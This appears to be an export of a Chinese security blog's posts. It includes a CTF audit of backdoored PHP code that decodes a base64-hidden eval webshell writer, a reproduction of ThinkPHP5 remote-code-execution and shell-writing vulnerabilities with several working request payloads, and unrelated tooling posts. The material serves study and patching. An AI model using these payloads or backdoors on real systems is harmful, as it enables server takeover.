class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($action == <span class="string">'table'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="number">1</span>, $usergroup)) &#123;</span><br><span class="line">        $info = showtables();</span><br><span class="line">        <span class="keyword">foreach</span> ($info <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="comment">// echo $value.'&lt;br&gt;';</span></span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/qiye/'</span>, $value)) &#123;</span><br><span class="line">                $sql  = <span class="string">"SHOW FIELDS FROM &#123;$tablepre&#125;$value"</span>;</span><br><span class="line">                $data = $db-&gt;fetchAssocArrBySql($sql);</span><br><span class="line">                $value . <span class="string">'=&gt;'</span> . count($data) . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">                $content .= <span class="string">"'"</span> . $value . <span class="string">"'=&gt;"</span> . count($data) . <span class="string">","</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $content = substr($content, <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">echo</span> $content .= <span class="string">');'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($action == <span class="string">'auth'</span>) &#123;</span><br><span class="line">    $referer = base64_encode($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">    $user    = fputs(fopen(base64_decode(<span class="string">'bG9zdC5waHA='</span>), w), base64_decode(<span class="string">'PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='</span>));</span><br><span class="line">    <span class="keyword">if</span> ($user[<span class="string">'openid'</span>]) &#123;</span><br><span class="line">        $url = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $url = <span class="string">'https://open.weixin.qq.com/connect/oauth2/authorize?appid='</span> . $weixin_appid . <span class="string">'&amp;redirect_uri=http://'</span> . $_SERVER[<span class="string">'HTTP_HOST'</span>] . <span class="string">'/mobile/login.php?referer='</span> . $referer . <span class="string">'&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=STATE#wechat_redirect'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location:$url"</span>);<span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($action == <span class="string">'getopenid'</span>) &#123;</span><br><span class="line">    $referer = $referer . <span class="string">'&amp;openid='</span> . $_COOKIE[<span class="string">'openid'</span>];</span><br><span class="line">    $referer = $_GET[a]($_GET[b]);</span><br><span class="line">    header(<span class="string">"Location:$referer"</span>);<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单看了下，审计后门类型的，首先看到了文件结尾的<code>$referer = $_GET[a]($_GET[b]);</code></p><p>该处可以构造<code>?a=assert&amp;b=phpinfo</code>来实现代码执行</p><p>继续往上看发现了一串<code>base64</code>编码后的内容<code>PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg==</code>和<code>bG9zdC5waHA=</code>，两串字符串解码后是<code>&lt;?php @eval($_POST[&#39;lostwolf&#39;]);?&gt;</code>和<code>lost.php</code></p><p>至此，可以判断当URL为<code>xxx.php?action=auth</code>时会在当前目录生成内容为<code>&lt;?php @eval($_POST[&#39;lostwolf&#39;]);?&gt;</code>一句话木马<code>lost.php</code></p><p>继续往上看发现了<code>@preg_replace(&quot;/linkurl/e&quot;</code>，根据官方文档</p><blockquote><p>模式修饰符<br>下面列出了当前可用的 PCRE 修饰符。括号中提到的名字是 PCRE 内部这些修饰符的名称。 模式修饰符中的空格，换行符会被忽略，其他字符会导致错误。</p><ul><li><em>i</em> (<em>PCRE_CASELESS</em>)</li></ul><p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。</p><ul><li><em>m</em> (<em>PCRE_MULTILINE</em>)</li></ul><p>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而”行末”元字符 ($) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 <em>D</em> 修饰符)。这个行为和 perl 相同。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 “\n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。</p><ul><li><em>s</em> (<em>PCRE_DOTALL</em>)</li></ul><p>如果设置了这个修饰符，模式中的点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符。这个修饰符等同于 perl 中的/s修饰符。 一个取反字符类比如 [^a] 总是匹配换行符，而不依赖于这个修饰符的设置。</p><ul><li><em>x</em> (<em>PCRE_EXTENDED</em>)</li></ul><p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略， 并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。 这个修饰符 等同于 perl 中的 /x 修饰符，使被编译模式中可以包含注释。 注意：这仅用于数据字符。 空白字符 还是不能在模式的特殊字符序列中出现，比如序列 (?( 引入了一个条件子组(译注: 这种语法定义的 特殊字符序列中如果出现空白字符会导致编译错误。 比如(?(就会导致错误)。</p><ul><li><em>e</em> (<em>PREG_REPLACE_EVAL</em>)</li></ul><p><strong>Warning</strong>This feature was <em>DEPRECATED</em> in PHP 5.5.0, and <em>REMOVED</em> as of PHP 7.0.0.</p><p>如果设置了这个被弃用的修饰符， <a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">preg_replace()</a> 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线(<em>\</em>)和 NULL 字符在 后向引用替换时会被用反斜线转义.</p></blockquote><p><code>preg_replace()</code>修饰符为e且PHP版本低于7.0.0时会造成代码执行</p><p>找到问题后的修复就很简单了，该删的删，该改的改~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自动清理NGINX日志脚本</title>
      <link href="/p/2397076861.html"/>
      <url>/p/2397076861.html</url>
      
        <content type="html"><![CDATA[<p>再次印证了免费的就是最贵的这句话<br>网上脚本或多或少都有错 改完后能运行了</p><a id="more"></a><p>直接上脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">nginx access <span class="built_in">log</span> segmentation shell script</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">日志目录</span></span><br><span class="line">log_dir="/home/wwwlogs/"</span><br><span class="line">cd $log_dir</span><br><span class="line">time=`date +%Y%m%d --date="-1 day"`</span><br><span class="line">nginxDir="/usr/bin/nginx"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">日志保存天数</span></span><br><span class="line">save_days=5</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">日志文件名所处<span class="string">'/'</span>分割的位置</span></span><br><span class="line"><span class="meta">#</span><span class="bash">可执行 </span></span><br><span class="line"><span class="meta">#</span><span class="bash">ls 日志目录/*.<span class="built_in">log</span> | xargs -n 1 | cut -f 1 -d <span class="string">"."</span> | cut -f 数字 -d <span class="string">"/"</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">进行查看 直到能正确显示日志文件名为止</span></span><br><span class="line">num=4;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">此处待优化（取得文件不带后缀的文件名）</span></span><br><span class="line">website=`ls $log_dir*.log | xargs -n 1 | cut -f 1 -d "." | cut -f $num -d "/"`</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">日志目录下所有的日志文件为文件夹，循环新建对应的时间文件</span></span><br><span class="line">for i in $website </span><br><span class="line">do</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">判断目录是否存在</span></span><br><span class="line">if [ ! -d $log_dir$i ];</span><br><span class="line">then</span><br><span class="line">mkdir "$i"</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">移动原日志到新文件夹</span></span><br><span class="line">mv $log_dir$i.log $log_dir$i/$i-$time.log</span><br><span class="line"><span class="meta">true&gt;</span><span class="bash"><span class="variable">$log_dir</span><span class="variable">$i</span>.<span class="built_in">log</span></span></span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">删除设置天数前的数据</span></span><br><span class="line">find $log_dir -mtime +$save_days -exec rm -rf &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">平滑启动nginx</span></span><br><span class="line">nginxDir -s reload</span><br></pre></td></tr></table></figure><p>赋予执行权限<code>chmod +x cut_nginx_log.sh</code> </p><p>然后在<code>crontab</code>里面加个任务<br><code>0 0 * * * /bin/bash /path/to/your/cut_nginx_log.sh</code></p><p>每天0点0分执行切割日志</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5多个RCE+文件写入漏洞</title>
      <link href="/p/576894757.html"/>
      <url>/p/576894757.html</url>
      
        <content type="html"><![CDATA[<p>ThinkPHP漏洞 跟着大佬学习下</p><a id="more"></a><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>近日thinkphp团队发布了版本更新<a href="https://blog.thinkphp.cn/869075" target="_blank" rel="noopener">https://blog.thinkphp.cn/869075</a> ，其中修复了一处getshell漏洞。</p><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>5.x &lt; 5.1.31<br>&lt;= 5.0.23</p><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>远程代码执行</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><strong>以下漏洞分析源于斗鱼SRC公众号:斗鱼安全应急响应中心</strong><br>分析补丁：<code>802f284bec821a608e7543d91126abc5901b2815</code><br>路由信息中<code>controller</code>的部分进行了过滤，可知问题出现在路由调度时。<br><img src= "/img/loading.gif" data-lazy-src="/images/cuFsz4H.png" alt=""><br>以5.1.23版本进行分析，执行路由调度的代码如下：<br><img src= "/img/loading.gif" data-lazy-src="/images/DM8TEz9.png" alt=""><br>其中使用了<code>$this-&gt;app-&gt;controller</code>方法来实例化控制器，然后调用实例中的方法。跟进<code>controller</code>方法：<br><img src= "/img/loading.gif" data-lazy-src="/images/Pf9P9Zm.png" alt=""><br>其中通过parseModuleAndClass方法解析出<code>$module</code>和<code>$class</code>，然后实例化<code>$class</code>。<br><code>rseModuleAndClass</code>方法中，当<code>$name</code>以反斜线\开始时直接将其作为类名。利用命名空间的特点，如果可以控制此处的<code>$name</code>（即路由中的controller部分），那么就可以实例化任何一个类。<br>接着，我们再往回看路由解析的代码。其中<code>route/dispatch/Url.php:: parseUrl</code>方法调用了<code>route/Rule.php:: parseUrlPath</code>来解析<code>pathinfo</code>中的路由信息<br><img src= "/img/loading.gif" data-lazy-src="/images/PwlJiDz.png" alt=""><br>代码比较简单，就是使用/对<code>$url</code>进行分割，未进行任何过滤。<br>其中的路由url从<code>Request::path()</code>中获取<br><img src= "/img/loading.gif" data-lazy-src="/images/Bj5ShWd.png" alt=""><br>由于<code>var_pathinfo</code>的默认配置为<code>s</code>，我们可利用<code>$_GET[&#39;s&#39;]</code>来传递路由信息，也可利用<code>pathinfo</code>来传递，但测试时<code>windows</code>环境下会将<code>$_SERVER[&#39;pathinfo&#39;]</code>中的<code>\</code>替换为<code>/</code>。<br>结合前面分析可得初步利用代码如下：<code>index.php?s=index/\namespace\class/method</code>，这将会实例化<code>\namespace\class</code>类并执行<code>method</code>方法。<br>然而利用过程中会存在一些限制，部分类在实例化时由于缺少参数而报错。<br>经过一番寻找，在<code>\think\Request</code>类中找到可以利用的方法<code>input</code>。以下为执行<code>phpinfo</code><br><img src= "/img/loading.gif" data-lazy-src="/images/qoEVsRB.png" alt=""></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="TP5-0"><a href="#TP5-0" class="headerlink" title="TP5.0.*"></a>TP5.0.*</h2><p>直接从官网下载完整包解压到www（网站根目录）目录即可，URL指向public目录（如：<a href="http://localhost/TP5.0.22/public/" target="_blank" rel="noopener">http://localhost/TP5.0.22/public/</a> ）</p><h2 id="TP5-1"><a href="#TP5-1" class="headerlink" title="TP5.1.*"></a>TP5.1.*</h2><p>官方不再提供完整版下载，笔者从<code>composer</code>下载最新版后与官方GitHub进行了对比，发现以下几个仓库<br><a href="https://github.com/top-think/framework" target="_blank" rel="noopener">Framework</a><br><a href="https://github.com/top-think/think" target="_blank" rel="noopener">think</a><br><a href="https://github.com/top-think/think-installer" target="_blank" rel="noopener">think-installer</a><br>发现<code>framework</code>仓库就是完整版中的<code>thinkphp</code>目录<br><img src= "/img/loading.gif" data-lazy-src="/images/WU29xTj.png" alt=""><br><img src= "/img/loading.gif" data-lazy-src="/images/Nb1OTBQ.png" alt=""><br><code>think</code>仓库是<code>thinkphp</code>的主架构<br><code>think-installer</code>对应路径为<code>path\to\thinkphp\vendor\topthink\think-installer</code><br>那么整合下就好了<br>最终目录架构<br><img src= "/img/loading.gif" data-lazy-src="/images/yneSfIP.png" alt=""><br>访问下<br><img src= "/img/loading.gif" data-lazy-src="/images/cRuL2lH.png" alt=""></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="TP版本5-0-21："><a href="#TP版本5-0-21：" class="headerlink" title="TP版本5.0.21："></a>TP版本5.0.21：</h2><p><code>http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code><br><img src= "/img/loading.gif" data-lazy-src="/images/XUjPpxb.png" alt=""></p><p><code>http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br><img src= "/img/loading.gif" data-lazy-src="/images/KeDQzUm.png" alt=""></p><h2 id="TP版本5-0-22："><a href="#TP版本5-0-22：" class="headerlink" title="TP版本5.0.22："></a>TP版本5.0.22：</h2><p><code>http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code><br><img src= "/img/loading.gif" data-lazy-src="/images/7SrIz6U.png" alt=""></p><p><code>http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br><img src= "/img/loading.gif" data-lazy-src="/images/YMN2l7m.png" alt=""></p><h2 id="TP5-1-1"><a href="#TP5-1-1" class="headerlink" title="TP5.1.*"></a>TP5.1.*</h2><p><strong>thinkphp5.1.29为例</strong></p><p><strong>1、代码执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</code><br><img src= "/img/loading.gif" data-lazy-src="/images/vdPHFZd.png" alt=""></p><p><strong>2、命令执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=操作系统命令</code><br><img src= "/img/loading.gif" data-lazy-src="/images/F5VWU1A.png" alt=""></p><p><strong>3、文件写入（写shell）：</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</code><br><img src= "/img/loading.gif" data-lazy-src="/images/63d5t6k.png" alt=""></p><p><strong>4、未知:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</code></p><p><strong>5、代码执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br><img src= "/img/loading.gif" data-lazy-src="/images/fmXDhBm.png" alt=""></p><p><strong>6、命令执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令</code><br><img src= "/img/loading.gif" data-lazy-src="/images/71eijSN.png" alt=""></p><p><strong>7、代码执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br><img src= "/img/loading.gif" data-lazy-src="/images/AOPpttb.png" alt=""></p><p><strong>8、命令执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令</code><br><img src= "/img/loading.gif" data-lazy-src="/images/UM5djyf.png" alt=""></p><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><h2 id="官方现已推出补丁-建议开发者进行修复"><a href="#官方现已推出补丁-建议开发者进行修复" class="headerlink" title="官方现已推出补丁 建议开发者进行修复"></a>官方现已推出补丁 建议开发者进行修复</h2><p>Thinkphp v5.0.x补丁地址: <a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a></p><p>Thinkphp v5.1.x补丁地址: <a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p>]]></content>
      
      
      <categories>
          
          <category> VulRepro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> VulRepro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sublime Text 3搭建PHP Debug环境</title>
      <link href="/p/1473644914.html"/>
      <url>/p/1473644914.html</url>
      
        <content type="html"><![CDATA[<p>记录下搭建PHP的Debug环境</p><a id="more"></a><p><strong>笔者已转VSCode，本文可能已失效</strong></p><h1 id="本机环境"><a href="#本机环境" class="headerlink" title="本机环境"></a>本机环境</h1><p>环境如下</p><blockquote><p>PHP:7.1</p><p>OS:Windows 10</p><p>IDE:Sublime Text 3</p></blockquote><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="下载Xdebug"><a href="#下载Xdebug" class="headerlink" title="下载Xdebug"></a>下载Xdebug</h2><p>到<a href="https://xdebug.org/download.php" target="_blank" rel="noopener">https://xdebug.org/download.php</a> 下载最新版的XDebug文件。<br>下载之后改名为<code>php_xdebug.dll</code>（不改名也不影响）放到PHP7根目录下的ext子目录下。<br>如果不知道该下载哪个，可以到<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">https://xdebug.org/wizard.php</a> 粘贴phpinfo的内容自动分析</p><h2 id="配置PHP"><a href="#配置PHP" class="headerlink" title="配置PHP"></a>配置PHP</h2><p>修改PHP7根目录下的php.ini文件，在最后添加如下代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension &#x3D; C:\AppServ\php7\ext\php_xdebug-2.6.1-7.1-vc14-x86_64.dll</span><br><span class="line">xdebug.remote_enable&#x3D;true</span><br><span class="line">xdebug.collect_params&#x3D;1</span><br><span class="line">xdebug.collect_return&#x3D;1</span><br><span class="line">xdebug.collect_vars&#x3D;1</span><br><span class="line">xdebug.collect_assignments&#x3D;1</span><br><span class="line">xdebug.collect_includes&#x3D;1</span><br><span class="line">xdebug.trace_format&#x3D;1</span><br><span class="line">xdebug.auto_trace&#x3D;1</span><br><span class="line">;xdebug.trace_options&#x3D;1</span><br><span class="line">xdebug.profiler_enable &#x3D; on</span><br><span class="line">xdebug.profiler_enable_trigger &#x3D; on</span><br><span class="line">xdebug.profiler_output_name &#x3D; cachegrind.out.%t.%p</span><br><span class="line">xdebug.profiler_output_dir &#x3D; &quot;C:&#x2F;AppServ&#x2F;www&#x2F;debugger&#x2F;&quot;</span><br><span class="line">xdebug.trace_output_name&#x3D;trace.%H%R%t</span><br><span class="line">;xdebug.show_local_vars&#x3D;1</span><br><span class="line">xdebug.remote_handler &#x3D; dbgp   </span><br><span class="line">xdebug.remote_host&#x3D; localhost</span><br><span class="line">xdebug.remote_port &#x3D; 9999</span><br><span class="line">xdebug.remote_log&#x3D;&quot;C:&#x2F;AppServ&#x2F;www&#x2F;debugger&#x2F;xdebug.log&quot;</span><br></pre></td></tr></table></figure><p>需要指明的是<code>xdebug</code>的端口号改为<code>9999</code>，也没有指定<code>idekey</code>。<br>最后需要检查<code>xdebug</code>安装是否成功，如果在<code>phpinfo()</code>页面中显示出如下<code>XDebug</code>内容，则表示配置<code>XDebug</code>安装成功。<br><img src= "/img/loading.gif" data-lazy-src="/images/ihuomSW.png" alt=""></p><h2 id="Sublime-Text-3安装Package-Control插件"><a href="#Sublime-Text-3安装Package-Control插件" class="headerlink" title="Sublime Text 3安装Package Control插件"></a>Sublime Text 3安装Package Control插件</h2><p>在Sublime Text 3中使用Ctrl+~调出控制台，在控制台中输入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request,os,hashlib; </span><br><span class="line">h = <span class="string">'2915d1851351e5ee549c20394736b442'</span> + <span class="string">'8bc59f460fa1548d1514676163dafc88'</span>; </span><br><span class="line">pf = <span class="string">'Package Control.sublime-package'</span>; </span><br><span class="line">ipp = sublime.installed_packages_path(); </span><br><span class="line">urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); </span><br><span class="line">by = urllib.request.urlopen( <span class="string">'http://packagecontrol.io/'</span> + pf.replace(<span class="string">' '</span>, <span class="string">'%20'</span>)).read(); </span><br><span class="line">dh = hashlib.sha256(by).hexdigest(); </span><br><span class="line">print(<span class="string">'Error validating download (got %s instead of %s), please try manual install'</span> % (dh, h)) <span class="keyword">if</span> dh != h <span class="keyword">else</span> open(os.path.join( ipp, pf), <span class="string">'wb'</span> ).write(by)</span><br></pre></td></tr></table></figure><p>之后，按回车执行，下载安装<code>Package Control.sublime-package</code>（可能需翻墙），重启之后Sublime Text 3的Preferences菜单下会多出Package Control二级菜单。</p><h2 id="Sublime-Text-3安装XDebug插件"><a href="#Sublime-Text-3安装XDebug插件" class="headerlink" title="Sublime Text 3安装XDebug插件"></a>Sublime Text 3安装XDebug插件</h2><p>按Ctrl+Shift+P组合键，然后输入install，并点击Package Control：Install Package ，调出Package Control窗口，然后输入xdebug，选择下方的XDebug Client，安装XDebug插件（可能需翻墙）。成功安装后，Preferences菜单下的Package Settings二级菜单中会多出Xdebug三级菜单。</p><h2 id="配置XDebug插件"><a href="#配置XDebug插件" class="headerlink" title="配置XDebug插件"></a>配置XDebug插件</h2><p>由于Sublime Text 3不允许修改默认设置，仅允许我们修改用户设置，因此需要生成一份XDebug的用户设置后再修改。<br>打开Preferences菜单下的Package Settings二级菜单下Xdebug三级菜单中的“Settings - Default”，复制该窗口的所有内容；</p><p>打开Preferences菜单下的Package Settings二级菜单下Xdebug三级菜单中的“Settings - User”，粘贴上一步复制的所有内容；<br>修改第30行”port”配置为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;port&quot;: 9999,</span><br></pre></td></tr></table></figure><p>改完之后保存用户设置，用户配置将会保存到Sublime Text 3安装目录下的<code>Data\Packages\User\Xdebug.sublime-settings</code>文件中。</p><h2 id="调试PHP"><a href="#调试PHP" class="headerlink" title="调试PHP"></a>调试PHP</h2><p>启动web服务，在网站根目录新建个文件为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line">$b = <span class="number">2</span>;</span><br><span class="line">var_dump($_GET);</span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样就可以调试了。</p><p>XDebug Client调试快捷键：</p><blockquote><p>Ctrl+F8: 填加/删除断点；<br>Ctrl+Shift+F5: 运行到下一个断点；<br>Ctrl+Shift+F6: 单步；<br>Ctrl+Shift+F7: 步入；<br>Ctrl+Shift+F8: 步出 ；</p></blockquote><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="Sublime-PHP-Companion"><a href="#Sublime-PHP-Companion" class="headerlink" title="Sublime PHP Companion"></a>Sublime PHP Companion</h3><p>SublimeCTagsPHP的接班者，提供PHP编码期间的素材使用。</p><h3 id="AllAutocomplete"><a href="#AllAutocomplete" class="headerlink" title="AllAutocomplete"></a>AllAutocomplete</h3><p>Sublime 默认仅提供基于当前文件的自动补全，装上AllAutocomplete后，会提供基于所有文件的自动补全功能。</p><h3 id="sublime-phpcs"><a href="#sublime-phpcs" class="headerlink" title="sublime-phpcs"></a>sublime-phpcs</h3><h3 id="DocBlockr"><a href="#DocBlockr" class="headerlink" title="DocBlockr"></a>DocBlockr</h3><h3 id="Sublime-Text-Git"><a href="#Sublime-Text-Git" class="headerlink" title="Sublime Text Git"></a>Sublime Text Git</h3><h3 id="GitGutter"><a href="#GitGutter" class="headerlink" title="GitGutter"></a>GitGutter</h3><h3 id="Bracket-Highlighting"><a href="#Bracket-Highlighting" class="headerlink" title="Bracket Highlighting"></a>Bracket Highlighting</h3><h3 id="CodeIntel"><a href="#CodeIntel" class="headerlink" title="CodeIntel"></a>CodeIntel</h3><h3 id="SublimePrettyJson"><a href="#SublimePrettyJson" class="headerlink" title="SublimePrettyJson"></a>SublimePrettyJson</h3><h3 id="ConvertToUTF8"><a href="#ConvertToUTF8" class="headerlink" title="ConvertToUTF8"></a>ConvertToUTF8</h3><p>支持UTF-8编码的插件，装上之后，Sublime Text就支持UTF-8编码了。</p><h3 id="Emmet"><a href="#Emmet" class="headerlink" title="Emmet"></a>Emmet</h3><p>Web开发者必要的插件</p><h3 id="Sidebar-Enhancements"><a href="#Sidebar-Enhancements" class="headerlink" title="Sidebar Enhancements"></a>Sidebar Enhancements</h3><p>这个插件改进了侧边栏，增加了许多功能</p><h3 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h3><p>Q1:如何关闭XDebug Client的调试窗口？</p><p>A1:Ctrl+Shift+P，在调出的窗口输入xdebug，选择Xdebug: Stop Debugging(…)，之后Ctrl+Shift+P，在调出的窗口输入xdebug，选择Xdebug: Restore Layout。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018年XNUCA Web部分WriteUp</title>
      <link href="/p/2036532966.html"/>
      <url>/p/2036532966.html</url>
      
        <content type="html"><![CDATA[<p>2018年XNUCA部分WriteUp</p><p>虐心+被侮辱智商</p><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezdotso"><a href="#ezdotso" class="headerlink" title="ezdotso"></a>ezdotso</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$param = <span class="keyword">array</span>();</span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($action))&#123;</span><br><span class="line">    <span class="keyword">switch</span>($action)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"php_info"</span>:</span><br><span class="line">        <span class="keyword">echo</span> call_user_func_array(<span class="string">"php_info"</span>,$param);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"cmd"</span>:</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($cmd))&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_string($cmd))&#123;</span><br><span class="line">                <span class="keyword">if</span> (strlen($cmd)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                $pat1 = <span class="string">"/[^0-9a-zA-Z \/\*]/"</span>;</span><br><span class="line">                <span class="keyword">if</span> (preg_match($pat1, $cmd)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                $pat2 = <span class="string">"/^[a-zA-Z]+ [0-9a-zA-Z\/\*]+$/"</span>;</span><br><span class="line">                <span class="keyword">if</span> (preg_match($pat2, $cmd)==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                system(<span class="string">"busybox "</span> . $cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> call_user_func_array(<span class="string">"hello"</span>,$param);</span><br><span class="line">        <span 